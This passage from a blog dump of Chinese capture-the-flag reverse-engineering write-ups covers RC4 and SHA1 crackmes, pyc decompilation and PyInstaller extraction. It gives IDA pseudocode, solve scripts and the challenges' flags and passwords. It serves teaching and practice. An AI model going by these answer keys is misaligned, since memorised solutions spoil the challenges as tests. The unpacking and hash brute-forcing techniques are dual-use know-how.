(v11 + v10) % 256;\n    S_box[v9] = S_box[v10];\n    S_box[v10] = v11;\n    v12 = v23;\n    flag[v23] ^= S_box[(unsigned __int8)(v11 + S_box[v9])];\n    v23 = v12 + 1;\n  &#125;\n  while ( v12 + 1 &lt; v3 );\n  v10 = 0;\n&#125;\n\n这个部分和正常的RC4倒是没有区别。\n\n修改变量后的函数\nint __cdecl main(int argc, const char **argv, const char **envp)\n&#123;\n  unsigned int len_flag; // kr00_4\n  unsigned int len_key; // kr04_4\n  int i; // ecx\n  int i_1; // edi\n  int j_1; // ebx\n  unsigned __int8 v8; // dl\n  int i_2; // edi\n  int j_2; // ebx\n  unsigned __int8 v11; // dl\n  int v12; // ecx\n  unsigned int j; // ecx\n  char *v14; // eax\n  char v16; // [esp-1Ch] [ebp-55Ch]\n  char v17; // [esp+0h] [ebp-540h]\n  char v18; // [esp+0h] [ebp-540h]\n  __int128 rflag[2]; // [esp+Ch] [ebp-534h]\n  int v20; // [esp+2Ch] [ebp-514h]\n  int v21; // [esp+30h] [ebp-510h]\n  __int16 v22; // [esp+34h] [ebp-50Ch]\n  int v23; // [esp+38h] [ebp-508h]\n  char flag[512]; // [esp+3Ch] [ebp-504h] BYREF\n  char T_box[256]; // [esp+23Ch] [ebp-304h] BYREF\n  char key[256]; // [esp+33Ch] [ebp-204h] BYREF\n  char S_box[256]; // [esp+43Ch] [ebp-104h] BYREF\n\n  memset(S_box, 0, sizeof(S_box));\n  strcpy(key, \"tallmewhy\");\n  memset(&amp;key[10], 0, 0xF6u);\n  rflag[0] = xmmword_4021B0;\n  rflag[1] = xmmword_4021C0;\n  v20 = 0x54E6D699;\n  v21 = 0x14504F7A;\n  v22 = 0xECE5;\n  puts(\"Hello, this is my world.If you want flag, give me something I like.\");\n  sub_401010(\"\\\\n\", v16);\n  memset(flag, 0, sizeof(flag));\n  gets(flag);\n  len_flag = strlen(flag);\n  len_key = strlen(key);\n  memset(T_box, 0, sizeof(T_box));\n  for ( i = 0; i &lt; 256; ++i )\n  &#123;\n    S_box[i] = i;\n    T_box[i] = key[i % len_key];\n  &#125;\n  i_1 = 0;\n  j_1 = 0;\n  do\n  &#123;\n    v8 = S_box[i_1];\n    j_1 = (j_1 + T_box[i_1] + v8) % 256;\n    S_box[i_1++] = S_box[j_1];\n    S_box[j_1] = v8 ^ 0x37;\n  &#125;\n  while ( i_1 &lt; 256 );\n  sub_401010(\"\\\\n\\\\n\", v17);\n  i_2 = 0;\n  v23 = 0;\n  j_2 = 0;\n  if ( len_flag )\n  &#123;\n    do\n    &#123;\n      i_2 = (i_2 + 1) % 256;\n      v11 = S_box[i_2];\n      j_2 = (v11 + j_2) % 256;\n      S_box[i_2] = S_box[j_2];\n      S_box[j_2] = v11;\n      v12 = v23;\n      flag[v23] ^= S_box[(unsigned __int8)(v11 + S_box[i_2])];\n      v23 = v12 + 1;\n    &#125;\n    while ( v12 + 1 &lt; len_flag );\n    j_2 = 0;\n  &#125;\n  for ( j = 0; j &lt; len_flag; ++j )\n    j_2 = flag[j] == *((_BYTE *)rflag + j);\n  v14 = (char *)&amp;sorry;\n  if ( j_2 == 1 )\n    v14 = aGood;\n  sub_401010(v14, v18);\n  return 0;\n&#125;\n\n\n\n3.exp编写：1.思路分析：分析函数可以发现其实这个程序和RC4加密是一样的，只是在乱序时对s盒做了更改，那么编写exp时只需要注意这一个点就行，其他和普通RC4的解体方式是一样的。\n2.exp：v8 = [0xF5,0x8C,0x8D, 0xE4, 0x9F, 0xA5, 0x28, 0x65, 0x30, 0xF4,\n  \t\t0xEB,0xD3, 0x24, 0xA9, 0x91, 0x1A, 0x6F, 0xD4, 0x6A, 0xD7,\n  \t\t0x0B, 0x8D, 0xE8, 0xB8, 0x83, 0x4A, 0x5A, 0x6E, 0xBE, 0xCB,\n  \t\t0xF4, 0x4B, 0x99, 0xD6, 0xE6, 0x54, 0x7A, 0x4F, 0x50, 0x14,\n  \t\t0xE5, 0xEC]\ns = \"\"\nfor i in range(len(v8)):\n    s+=chr(v8[i])\nprint(\"加密后的明文为：%s\" %s)\nkey= \"tallmewhy\"\ns_box = [0]*256\nt_box = [0]*256\nflag = \"\"\n\ns_box = list(range(256))    #S盒的初始化\nfor i in range(256):\n    t_box[i]=ord(key[i % len(key)])\nprint(\"原来的 s 盒：%s\" % s_box)\n\nv3 = 0\nfor i in range(256):\n    tmp = s_box[i]\n    v3 = (tmp + v3 + t_box[i]) % 256\n    # 然后交换两个数\n    s_box[i] = s_box[v3]\n    s_box[v3] = tmp ^ 0x37    #对S盒进行乱序\nprint(\"乱序后的 s 盒：%s\" % s_box)\n\nv5 = 0\nv6 = 0\nv7 = 0\nwhile (v7 &lt; len(v8)):\n    v5 = (v5 + 1) % 256\n    v6 = (v6 + s_box[v5]) % 256\n    s_box[v5],s_box[v6] = s_box[v6],s_box[v5]    # 交换\n    flag += chr(v8[v7] ^ s_box[(s_box[v5] + s_box[v6]) &amp; 0xff])\n    v7 += 1\nprint(\"解密后的密文为：%s\" %flag)\n\nflag{c5e0f5f6-f79e-5b9b-988f-28f046117802}\n\n","slug":"RC4逆向题实例2","date":"2022-03-15T17:11:29.000Z","categories_index":"Reverse","tags_index":"WP,算法实例分析","author_index":"Big Devils"},{"id":"e046ec4a095c5d314105a6a20189055a","title":"RC4逆向题实例1","content":"从0到1例题：BabyAlgorithm1.基本信息探查：ELF文件，64位，无壳\n\n2.IDA分析：跟踪到主函数：\n__int64 __fastcall main(int a1, char **a2, char **a3)\n&#123;\n  __int64 result; // rax\n  int i; // [rsp+Ch] [rbp-E4h]\n  char key[16]; // [rsp+10h] [rbp-E0h] BYREF\n  char s[64]; // [rsp+20h] [rbp-D0h] BYREF\n  char v7[64]; // [rsp+60h] [rbp-90h] BYREF\n  char rflag[72]; // [rsp+A0h] [rbp-50h] BYREF\n  unsigned __int64 v9; // [rsp+E8h] [rbp-8h]\n\n  v9 = __readfsqword(0x28u);\n  memset(rflag, 0, 0x40uLL);\n  rflag[0] = 198;                               // rflag为加密后的字串\n  rflag[1] = 33;\n  rflag[2] = 202;\n  rflag[3] = 191;\n  rflag[4] = 81;\n  rflag[5] = 67;\n  rflag[6] = 55;\n  rflag[7] = 49;\n  rflag[8] = 117;\n  rflag[9] = 228;\n  rflag[10] = '\\\\x8E';\n  rflag[11] = '\\\\xC0';\n  rflag[12] = 'T';\n  rflag[13] = 'o';\n  rflag[14] = '\\\\x8F';\n  rflag[15] = -18;\n  rflag[16] = -8;\n  rflag[17] = 90;\n  rflag[18] = -94;\n  rflag[19] = -63;\n  rflag[20] = -21;\n  rflag[21] = -91;\n  rflag[22] = 52;\n  rflag[23] = 109;\n  rflag[24] = 113;\n  rflag[25] = 85;\n  rflag[26] = 8;\n  rflag[27] = 7;\n  rflag[28] = -78;\n  rflag[29] = -88;\n  rflag[30] = 47;\n  rflag[31] = -12;\n  rflag[32] = 81;\n  rflag[33] = -114;\n  rflag[34] = 12;\n  rflag[35] = -52;\n  qmemcpy(&amp;rflag[36], \"3S1\", 3);\n  rflag[40] = 64;\n  rflag[41] = -42;\n  rflag[42] = -54;\n  rflag[43] = -20;\n  rflag[44] = -44;\n  puts(\"Input flag: \");\n  (__isoc99_scanf)(\"%63s\", s);\n  if ( strlen(s) == 45 )\n  &#123;\n    strcpy(key, \"Nu1Lctf233\");            // key为密钥\n    RC4_crypto(key, s, v7);               // 加密函数，调用了三个参数，\n                                          //对于RC4来说第一个参数为密钥，第二个参\n                                          //数为s盒，第三个参数为指针装加密后的明文\n    for ( i = 0; i &lt;= 44; ++i )\n    &#123;\n      if ( v7[i] != rflag[i] )\n      &#123;\n        puts(\"GG!\");\n        return 0LL;\n      &#125;\n    &#125;\n    puts(\"Congratulations!\");\n    result = 0LL;\n  &#125;\n  else\n  &#123;\n    puts(\"GG!\");\n    result = 0LL;\n  &#125;\n  return result;\n&#125;\n\n为了方便这里的函数直接重命名了，然后跟踪RC4_func函数：\n__int64 __fastcall RC4_func(__int64 a1, __int64 a2, __int64 a3)\n&#123;\n  char v5[264]; // [rsp+20h] [rbp-110h] BYREF\n  unsigned __int64 v6; // [rsp+128h] [rbp-8h]\n\n  v6 = __readfsqword(0x28u);\n  rc4_init(a1, v5);                             // S盒的初始化\n  rc4_crypt(v5, a2, a3);                        // rc4的加密函数\n  return 0LL;\n&#125;\n\n可以看到这个函数的功能就是基本的调用两个函数来进行rc4加密\n先看S盒的初始化函数rc4_init：\n__int64 __fastcall rc4_init(const char *a1, __int64 a2)\n&#123;\n  int v3; // [rsp+10h] [rbp-10h]\n  int i; // [rsp+14h] [rbp-Ch]\n  int j; // [rsp+18h] [rbp-8h]\n  int v6; // [rsp+1Ch] [rbp-4h]\n\n  v6 = strlen(a1);\n  v3 = 0;\n  for ( i = 0; i &lt;= 255; ++i )                  // 给s盒赋值\n    *(i + a2) = i;\n  for ( j = 0; j &lt;= 255; ++j )                  // 通过key来打乱s盒\n  &#123;\n    v3 = (*(j + a2) + v3 + a1[j % v6]) % 256;\n    swap((j + a2), (a2 + v3));\n  &#125;\n  return 0LL;\n&#125;\n\n加密函数rc4_crypt：\n__int64 __fastcall sub_400753(__int64 a1, const char *a2, __int64 a3)\n&#123;\n  int v5; // [rsp+24h] [rbp-1Ch]\n  int v6; // [rsp+28h] [rbp-18h]\n  size_t v7; // [rsp+30h] [rbp-10h]\n  size_t v8; // [rsp+38h] [rbp-8h]\n\n  v5 = 0;\n  v6 = 0;\n  v7 = 0LL;\n  v8 = strlen(a2);\n  while ( v7 &lt; v8 )\n  &#123;\n    v5 = (v5 + 1) % 256;\n    v6 = (v6 + *(v5 + a1)) % 256;\n    swap((v5 + a1), (a1 + v6));\n    *(a3 + v7) = a2[v7] ^ *((*(v5 + a1) + *(v6 + a1)) + a1);\n    ++v7;\n  &#125;\n  return 0LL;\n&#125;\n\n这个题其实是为了熟悉RC4算法在逆向里的表现特征，理解函数的作用，根据RC4的体征来说，因为异或的特点加密与解密使用的是同一个函数，所以只要知道了key就可以直接解出这个题的flag。\n3.EXP：v8 = [0xc6, 0x21, 0xca, 0xbf, 0x51, 0x43, 0x37, 0x31, 0x75, 0xe4, 0x8e, 0xc0, 0x54, 0x6f, 0x8f, 0xee, 0xf8, 0x5a, 0xa2,\n     0xc1, 0xeb, 0xa5, 0x34, 0x6d, 0x71, 0x55, 0x8, 0x7, 0xb2, 0xa8, 0x2f, 0xf4, 0x51, 0x8e, 0xc, 0xcc, 0x33, 0x53,\n     0x31, 0x0, 0x40, 0xd6, 0xca, 0xec, 0xd4]\n\ns = \"\"\nfor i in range(len(v8)):       #输出加密后的明文\n    s+=chr(v8[i])\nprint(\"加密后的明文为：%s\" %s)\n\nkey= \"Nu1Lctf233\"        #因题目而异\ns_box = [0]*256\nt_box = [0]*256\nflag = \"\"\n\n\ns_box = list(range(256))    #S盒的初始化\nfor i in range(256):\n    t_box[i]=ord(key[i % len(key)])   #生成临时变量T盒\nprint(\"原来的 s 盒：%s\" % s_box)\n\nv3 = 0                    #对S盒进行乱序\nfor j in range(256):\n    v3 = (s_box[j] + v3 + t_box[j]) % 256\n    # 然后交换两个数\n    s_box[j],s_box[v3] = s_box[v3],s_box[j]   #对S盒进行乱序\nprint(\"乱序后的 s 盒：%s\" % s_box)\n\n        \nv5 = 0\nv6 = 0\nv7 = 0\nwhile (v7 &lt; len(v8)):           #加解密部分\n    v5 = (v5 + 1) % 256\n    v6 = (v6 + s_box[v5]) % 256\n    s_box[v5],s_box[v6] = s_box[v6],s_box[v5]    # 交换\n    flag += chr(v8[v7] ^ s_box[(s_box[v5] + s_box[v6]) &amp; 0xff])\n    v7 += 1\nprint(\"解密后的密文为：%s\" %flag)\n\n\nn1book{us1nG_f3atur3s_7o_de7erm1n3_4lg0ri7hm}\n","slug":"RC4逆向题实例1","date":"2022-03-15T11:46:07.000Z","categories_index":"Reverse","tags_index":"WP,算法实例分析","author_index":"Big Devils"},{"id":"a9a1a1638fa879e93ed0cd1f92852131","title":"RC4算法分析及逆向特征","content":"RC4算法分析一、RC4简介：RC4加密算法是密钥长度可变的流加密算法，其实就是生成一个密钥，然后去和明文XOR ，它还有一个特点就是它的密钥长度是可变的，范围是(1~256)字节。由此可以看出RC4算法的强度完全依赖于密钥的强度，如果获得密钥基本就可以直接获得明文。\n二、算法原理：1.原理概述：通过密钥(Key 1-256字节)，计算得到一个256字节的数组(S盒)，然后将S盒中的数据与明文或密文进行异或，以此进行加解密操作。\n注意：加解密过程中S盒中的数据会发生改变，所以加密或解密之前需要使用密钥对S盒数据进行重新初始化。\n2.加密过程：\nS盒初始化(S-box的作用是和明文异或，T作为临时变量)\nS的初始化是从0开始填充一直到255，而T根据密钥填充\nint i = 0;\n\t\tfor(i=0; i&lt;256; i++)\n\t\t\t&#123;\n        S[i] = i;\n        T[i] = K[i%len];\n      &#125;\n\n根据临时变量T来将S盒里面的值打乱\nunsigned char tmp = 0x00;\nint i = 0;\nint j = 0;\n \nfor(i=0; i&lt;256; i++)\n    &#123;\n      j = (j + S[i] + T[i]) % 256;  //需要注意的是S盒的值本身没有改变\n      tmp = S[j];                   //只是根据T将位置打乱了\n      S[j] = S[i];\n      S[i] = tmp;\n    &#125;\n\n加密\nunsigned char tmp = 0x00;\nint i = 0;\nint j = 0;\nint r = 0;\nint t = 0;\n \nfor(r=0; r&lt;len; r++)\n\t\t&#123;\n      i = (i + 1) % 256;\n      j = (j + S[i]) % 256;\n      tmp = S[j];\n      S[j] = S[i];\n      S[i] = tmp;\n      t = (S[i] + S[j]) % 256;\n      K[r] = S[t];\n \n\t\t\tE[i] = (M[i] ^ K[i])//M[]:明文 E[]:密文\n\t\t&#125;\n\n3.代码实例：//程序开始\n#include&lt;stdio.h>\n#include&lt;string.h>\ntypedef unsigned longULONG;\n \n/*初始化函数*/\nvoid rc4_init(unsigned char*s, unsigned char*key, unsigned long Len)\n&#123;\n    int i = 0, j = 0;\n    char k[256] = &#123; 0 &#125;;\n    unsigned char tmp = 0;\n    for (i = 0; i&lt;256; i++)\n    &#123;\n        s[i] = i;\n        k[i] = key[i%Len];\n    &#125;\n    for (i = 0; i&lt;256; i++)\n    &#123;\n        j = (j + s[i] + k[i]) % 256;\n        tmp = s[i];\n        s[i] = s[j];//交换s[i]和s[j]\n        s[j] = tmp;\n    &#125;\n&#125;\n \n/*加解密*/\nvoid rc4_crypt(unsigned char*s, unsigned char*Data, unsigned long Len)\n&#123;\n    int i = 0, j = 0, t = 0;\n    unsigned long k = 0;\n    unsigned char tmp;\n    for (k = 0; k&lt;Len; k++)\n    &#123;\n        i = (i + 1) % 256;\n        j = (j + s[i]) % 256;\n        tmp = s[i];\n        s[i] = s[j];//交换s[x]和s[y]\n        s[j] = tmp;\n        t = (s[i] + s[j]) % 256;\n        Data[k] ^= s[t];\n    &#125;\n&#125;\n \nint main()\n&#123;\n    unsigned char s[256] = &#123; 0 &#125;, s2[256] = &#123; 0 &#125;;//S-box\n    char key[256] = &#123; \"justfortest\" &#125;;\n    char pData[512] = \"这是一个用来加密的数据Data\";\n    unsigned long len = strlen(pData);\n    int i;\n \n    printf(\"pData=%s\\\\n\", pData);\n    printf(\"key=%s,length=%d\\\\n\\\\n\", key, strlen(key));\n    rc4_init(s, (unsigned char*)key, strlen(key));//已经完成了初始化\n    printf(\"完成对S[i]的初始化，如下：\\\\n\\\\n\");\n    for (i = 0; i&lt;256; i++)\n    &#123;\n        printf(\"%02X\", s[i]);\n        if (i &amp;&amp; (i + 1) % 16 == 0)putchar('\\\\n');\n    &#125;\n    printf(\"\\\\n\\\\n\");\n    for (i = 0; i&lt;256; i++)//用s2[i]暂时保留经过初始化的s[i]，很重要的！！！\n    &#123;\n        s2[i] = s[i];\n    &#125;\n    printf(\"已经初始化，现在加密:\\\\n\\\\n\");\n    rc4_crypt(s, (unsigned char*)pData, len);//加密\n    printf(\"pData=%s\\\\n\\\\n\", pData);\n    printf(\"已经加密，现在解密:\\\\n\\\\n\");\n    //rc4_init(s,(unsignedchar*)key,strlen(key));//初始化密钥\n    rc4_crypt(s2, (unsigned char*)pData, len);//解密\n    printf(\"pData=%s\\\\n\\\\n\", pData);\n    return 0;\n&#125;\n \n//程序完\n\n由于加密是用的xor，而根据异或的对称性，加密和解密使用的是同一个函数。\nRC4逆向特征分析1.RC4在逆向中的特征：\n一般来说会需要调用两个函数，一个用来初始化S盒，一个用来生成密钥流然后加密\n初始化的数组为256字节也可以作为参考，(但不一定就是256字节)\n密钥字串会被用来循环填充到一个新表\n最后一定会用xor进行加解密\n\n2.For Example：以加密与解密中的RC4Sample.exe：\nwinmain→DialogFunc→sub_401270，截取部分代码\nchar v14[1032]; // [esp+214h] [ebp-408h] BYREF\nv5[0] = 1;\nv5[1] = 35;\nv5[2] = 69;\nv5[3] = 103;\nv5[4] = -119;\nv5[5] = -85;\nv5[6] = -51;\nv5[7] = -17;\nv1 = GetDlgItemTextA(hDlg, 110, &amp;String, 257);\nif ( v1 )\n&#123;\n  memset(v14, 0, sizeof(v14));\n  sub_401000(v14, v5, 8);\n  sub_401070(v14, &amp;String, v1);\n\n可以看到下面有两个函数，定义了一个v14变量，大小为1032字节。v5数组里有8个值，两变量一起被调用到了sub_401000函数内，跟过去：\n\n这里有两个段重要代码：\ndo\n    *s_box_1++ = v5++;\n  while ( v5 &lt; 256 );\n\n上面这段对应了原理部分的给S盒赋初值\ndo\n  &#123;\n    v9 = *v8;\n    v10 = (unsigned __int8)(result + *v8 + *(_BYTE *)(v3 + k));\n    ++v3;\n    result = v10;\n    *v8 = v4[v10];\n    v4[v10] = v9;\n    if ( v3 >= k_len )\n      v3 = 0;\n    ++v8;\n    --v11;\n  &#125;\n  while ( v11 );\n\n这部分代码则是对S盒进行乱序操作。\n接着我们看第二个函数。\n\n注意最长的那一行，这个程序不像之前的那样有一个专门的数组放密文，而是直接覆盖掉了明文。\n3.总结：RC4函数没有魔数一类的值为特征，但是从结构来看肯定会有三个part，第一为s盒的初始化，第二个为打乱s盒，第三个为加解密函数也就是异或。\n从0到1总结的RC4的伪代码为：\ni = (i + 1) % 256;\nj = (j + s[i]) % 256;\nswap(s[i],s[j]);\nt=(s[i] + s[j]) % 256;\n\n","slug":"RC4算法分析及逆向特征","date":"2022-03-15T10:47:14.000Z","categories_index":"Crypto","tags_index":"reverse常见算法","author_index":"Big Devils"},{"id":"c34e721018d13d122ac641371d7bebf2","title":"python的逆向考点","content":"前置知识：\nhttps://magnificent-syrup-61f.notion.site/python-9aaee637228d499fabe9d08731f12c38\n考点一：pyc→pypyc转py的方法1.简单题一般可以用工具：uncompyle6，或者在线网站https://tool.lu/pyc直接转换成py源代码。\n例题为：1.pyc、findkey.pyc。\n2.题目难一点的话会让你不能直接用工具反汇编出源代码，如2021年的蓝帽杯半决赛就有一道题目无法用工具直接反汇编出源代码，此时我们就需要对pyc的文件结构及它的结构体进行分析。(这个Part还没整明白)\nFor Example:1.pyc解体思路：首先拿到的是一个pyc文件先尝试运行\n\n老套路让我们输入序列号，直接丢进在线反汇编网站：https://tool.lu/pyc\n反汇编后的python源码为：\n#!/usr/bin/env python\n# visit &lt;https://tool.lu/pyc/> for more information\nimport base64\n\ndef encode(message):\n    s = ''\n    for i in message:\n        x = ord(i) ^ 32\n        x = x + 16\n        s += chr(x)\n    \n    return base64.b64encode(s)\n\ncorrect = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'\nflag = ''\nprint 'Input flag:'\nflag = raw_input()\nif encode(flag) == correct:\n    print 'correct'\nelse:\n    print 'wrong'\n\n代码的大概思路是将输入的字符串的每个元素与32异或再加上16，最后进行base64的加密。\nexp：\nimport base64\nrf = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'\n\nrflag = base64.b64decode(rf)\nflag=''\nprint(rflag)\nfor i in rflag:\n    x=i-16\n    x=x^32\n    flag+=chr(x)\nprint(flag)\n\nflag为：nctf{d3c0mpil1n9_PyC}\ntips：\n在exp中一开始写了一个ord(i)-16,但是报错了，所以使用type查看了一下base64模块的返回值类型\nlook= type(base64.b64decode(rf))\nflag=''\nprint(look)\n\n\n可以看到返回的就是byte类型不需要转换了\n考点三如何识别：py文件可以通过某种方式编译为exe可执行程序。\n1.如何识别这是一个被打包的py文件呢：\n\n打开ida如果发现有很多python的字符串，那么基本就可以给它判刑了。\n\n工具打包后的exe图标一般都是一个样\n\n\n2.目前常用的打包方式有两种：\n\nPy2exe\nPyinstaller\n\n3.针对不同的打包方式有不同的提取方法：\nPy2exe: https://github.com/matiasb/unpy2exe\npyinstaller: https://github.com/pyinstaller/pyinstaller\n\t\t\t https://github.com/extremecoders-re/pyinstxtractor\nFor Example：(HWS计划 wp)首先拿到程序“login.exe”直接运行看一下\n\n让我们输入password，输入错误会显示“nope！”\n扔到查壳工具里，是未加壳的64位程序\nida64打开，直接查看字符串，这时就可以看到有很多与py有关的字串\n\n判断它是经过exe打包的py文件，但是无法确定它是用的哪种方式进行的打包，所以两种都试一下。\n首先尝试一下py2exe：\npython unpy2exe login.exe\n\n\n这里可以看到它显示着不是py2exe打包的程序。那么接着尝试Pyinstaller：\npython pyinstxtractor.py login.exe\n\n运行后显示提取成功，cmd内容如下：\nE:\\\\桌面\\\\seedle\\\\工具>python pyinstxtractor.py login.exe\npyinstxtractor.py:86: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses\n  import imp\n[*] Processing login.exe\n[*] Pyinstaller version: 2.1+\n[*] Python version: 27\n[*] Length of package: 3701450 bytes\n[*] Found 18 files in CArchive\n[*] Beginning extraction...please standby\n[+] Possible entry point: pyiboot01_bootstrap\n[+] Possible entry point: login\n[!] Warning: The script is running in a different python version than the one used to build the executable\n    Run this script in Python27 to prevent extraction errors(if any) during unmarshalling\n[*] Found 194 files in PYZ archive\n[*] Successfully extracted pyinstaller archive: login.exe\n\nYou can now use a python decompiler on the pyc files within the extracted directory\n\n上面的回显显示提取出来的东西放在了exetracted目录下\n\n进入login.exe_extracted文件夹\n\n在这个文件夹中，我们要找的文件没有后缀名，也不在其他的文件夹中，这个文件夹我们要找的就是login。\n这里一开始的思路是手动添加“.pyc”尾缀，然后放到在线反编译网站上转py源文件，但是可以看到反编译失败，但是看它返回的错误的意思是部分反汇编失败。\n这里百度得出的结果是提取出的文件缺失pyc文件的前面两个部分，一个是版本魔数，一个是创建时间\n把这个程序丢到二进制分析工具里面对比分析\n\n\n我们对比一下提取出来login文件和正常的文件的区别。\n正常的pyc文件是前面八个分别是四个字节版本魔数和四个字节的创建时间，之后才是PyCodeObject结构体\n\n而login文件是直接就是PyCodeObject结构体开头\n\n我们这里直接复制1.pyc的前面八个字节到login内，然后保存：\n\n此时再放到反编译网站就可以反编译成功了：\n\n#!/usr/bin/env python\n# visit &lt;https://tool.lu/pyc/> for more information\n\ndef check(a):\n    target = 'YWtmYHxgaGhjWHRzcmN+eg=='.decode('base64')\n    for i in range(len(a)):\n        if chr(ord(a[i]) ^ 7) != target[i]:\n            return 0\n    \n    return 1\n\na = raw_input('password:')\nif check(a) == 1:\n    print 'ok!'\nelse:\n    print 'nope!'\nraw_input()\n\nexp:\nimport base64\nrflag=base64.b64decode('YWtmYHxgaGhjWHRzcmN+eg==')\nflag=''\nfor i in range(len(rflag)):\n    flag+=chr(rflag[i]^7)\nprint(flag)\n\n\n","slug":"python的逆向考点","date":"2022-03-15T07:25:10.000Z","categories_index":"Reverse","tags_index":"语言逆向","author_index":"Big Devils"},{"id":"3fffde4c087696455aa9600680b2d3ff","title":"Crypto脑图","content":"加密一般分为对称加密(Symmetric Key Encryption)和非对称加密(Asymmetric Key Encryption)。\n对称加密又分为分组加密和序列密码。\n分组密码，也叫块加密(block cyphers)，一次加密明文中的一个块。是将明文按一定的位长分组，明文组经过加密运算得到密文组，密文组经过解密运算（加密运算的逆运算），还原成明文组。\n序列密码，也叫流加密(stream cyphers)，一次加密明文中的一个位。是指利用少量的密钥（制乱元素）通过某种复杂的运算（密码算法）产生大量的伪随机位流，用于对明文位流的加密。\n\n","slug":"Crypto脑图","date":"2022-03-15T07:17:46.000Z","categories_index":"Crypto","tags_index":"","author_index":"Big Devils"},{"id":"4b1fbc501a26eea6619e2e89180a8452","title":"md5逆向题实例","content":"知识点：\n\n\nrtf文件\nhttps://magnificent-syrup-61f.notion.site/rtf-e2d961992a914f4eab37f3356db9e994\n\n\n\natoi&#x2F;itoa函数\nhttps://magnificent-syrup-61f.notion.site/atoi-itoa-a9be71db8a864e128429d4e826a1ec2d\n\n\npython的hashlib库\nhttps://magnificent-syrup-61f.notion.site/python-hashlib-0c3d02fa25e9444d88b9d5ed30d25eb0\n\n\n题解前期分析：\n无壳，32位\nida分析：主函数的代码：\nint __cdecl main_0(int argc, const char **argv, const char **envp)\n&#123;\n  DWORD v3; // eax\n  DWORD v4; // eax\n  char Str[260]; // [esp+4Ch] [ebp-310h] BYREF\n  int v7; // [esp+150h] [ebp-20Ch]\n  char String1[260]; // [esp+154h] [ebp-208h] BYREF\n  char Destination[260]; // [esp+258h] [ebp-104h] BYREF\n\n  memset(Destination, 0, sizeof(Destination));\n  memset(String1, 0, sizeof(String1));\n  v7 = 0;\n  printf(\"pls input the first passwd(1): \");\n  scanf(\"%s\", Destination);                 //输入第一个密码\n  if ( strlen(Destination) != 6 )             //密码长度为6\n  &#123;\n    printf(\"Must be 6 characters!\\\\n\");\n    ExitProcess(0);\n  &#125;\n  v7 = atoi(Destination);                    //将数字字符准换为整型数据\n  if ( v7 &lt; 100000 )\n    ExitProcess(0);\n  strcat(Destination, \"@DBApp\");             //在密码字符串后面加上@DBApp\n  v3 = strlen(Destination);\n  sub_40100A((BYTE *)Destination, v3, String1);      //跳入这个加密函数(这是解开密码1的关键函数)\n  if ( !_strcmpi(String1, \"6E32D0943418C2C33385BC35A1470250DD8923A9\") )  //经过函数加密后与\n  &#123;\n    printf(\"continue...\\\\n\\\\n\");\n    printf(\"pls input the first passwd(2): \");\n    memset(Str, 0, sizeof(Str));\n    scanf(\"%s\", Str);\n    if ( strlen(Str) != 6 )\n    &#123;\n      printf(\"Must be 6 characters!\\\\n\");\n      ExitProcess(0);\n    &#125;\n    strcat(Str, Destination);\n    memset(String1, 0, sizeof(String1));\n    v4 = strlen(Str);\n    sub_401019((BYTE *)Str, v4, String1);\n    if ( !_strcmpi(\"27019e688a4e62a649fd99cadaafdb4e\", String1) )\n    &#123;\n      if ( !(unsigned __int8)sub_40100F(Str) )\n      &#123;\n        printf(\"Error!!\\\\n\");\n        ExitProcess(0);\n      &#125;\n      printf(\"bye ~~\\\\n\");\n    &#125;\n  &#125;\n  return 0;\n&#125;\n\n程序大概就是两次的密码验证\n\n首先分析第一个加密函数：\nint __cdecl sub_401230(BYTE *pbData, DWORD dwDataLen, LPSTR lpString1)\n&#123;\n  int result; // eax\n  DWORD i; // [esp+4Ch] [ebp-28h]\n  CHAR String2[4]; // [esp+50h] [ebp-24h] BYREF\n  BYTE v6[20]; // [esp+54h] [ebp-20h] BYREF\n  DWORD pdwDataLen; // [esp+68h] [ebp-Ch] BYREF\n  HCRYPTHASH phHash; // [esp+6Ch] [ebp-8h] BYREF\n  HCRYPTPROV phProv; // [esp+70h] [ebp-4h] BYREF\n\n  if ( !CryptAcquireContextA(&amp;phProv, 0, 0, 1u, 0xF0000000) )\n    return 0;\n  if ( CryptCreateHash(phProv, 0x8004u, 0, 0, &amp;phHash) )\n  &#123;\n    if ( CryptHashData(phHash, pbData, dwDataLen, 0) )\n    &#123;\n      CryptGetHashParam(phHash, 2u, v6, &amp;pdwDataLen, 0);\n      *lpString1 = 0;\n      for ( i = 0; i &lt; pdwDataLen; ++i )\n      &#123;\n        wsprintfA(String2, \"%02X\", v6[i]);\n        lstrcatA(lpString1, String2);\n      &#125;\n      CryptDestroyHash(phHash);\n      CryptReleaseContext(phProv, 0);\n      result = 1;\n    &#125;\n    else\n    &#123;\n      CryptDestroyHash(phHash);\n      CryptReleaseContext(phProv, 0);\n      result = 0;\n    &#125;\n  &#125;\n  else\n  &#123;\n    CryptReleaseContext(phProv, 0);\n    result = 0;\n  &#125;\n  return result;\n&#125;\n\n粗略看一下被调用的函数指向的算法为单向散列算法hash。\n百度一下这些函数已经被弃用了，主要的函数是：\n\nCryptCreateHash( )\nBOOL CryptAcquireContextA(\n  [out] HCRYPTPROV *phProv,     \\\\\\\\通过调用 CryptAcquireContext创建的 CSP 的句柄。\n  [in]  LPCSTR     szProvider,  \\\\\\\\标识要使用的哈希算法的ALG_ID值(要使用哪种加密算法)\n  [in]  DWORD      dwProvType,  \\\\\\\\如果散列算法的类型是键控散列，例如基于散列的消息验证码(HMAC) 或消息验证码(MAC) 算法，则在此参数中传递散列的密钥。对于非键控算法，此参数必须设置为零。\n  [in]  DWORD      dwFlags      \\\\\\\\函数将句柄复制到新哈希对象的地址。使用完散列对象后，通过调用CryptDestroyHash函数释放句柄。\n);\n\n核心成员是第二个它标识着用到的算法是哪一个\n\nLPCSTR的ALG_ID：具体算法与数值对应关系\n\n\n\n通过特征码8004，确定散列算法为SHA1,思路基本确定为爆破枚举，而且已知密码的前6位有数字组成后面加上六个字符@DBApp 。\nexp为：\nimport hashlib\nrflag='6E32D0943418C2C33385BC35A1470250DD8923A9'.lower()\nstr1='@DBApp'\n\nfor i in range(100000,1000000):\n    flag=str(i)+str1            #需要用str将整型转成字符串,达到三者数据类型相匹配\n    obj=hashlib.sha1(flag.encode(\"utf-8\"))\n    flag=obj.hexdigest()\n    if flag==rflag:\n        print(i)\n\n'''\n这里有一点需要注意hashlib加密后的十六进制的字母是以小写的形式，\n所以上面的判断直接比较的话一定会找不到，需要用字符串操作“lower”方法\n将rflag字串的大写字符转小写\n'''\n\n解体方式：  得出第一轮的密码为：123321\n    